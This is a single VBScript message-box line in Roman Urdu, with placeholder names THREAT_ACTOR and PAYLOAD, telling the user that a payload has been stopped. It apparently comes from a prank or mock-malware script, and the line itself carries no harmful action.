MsgBox "Mubarak ho!.. THREAT_ACTOR ne PAYLOAD rok diya he.. filhaal aap tang nai ho ge ;)", vbExclamation, "Stopped"
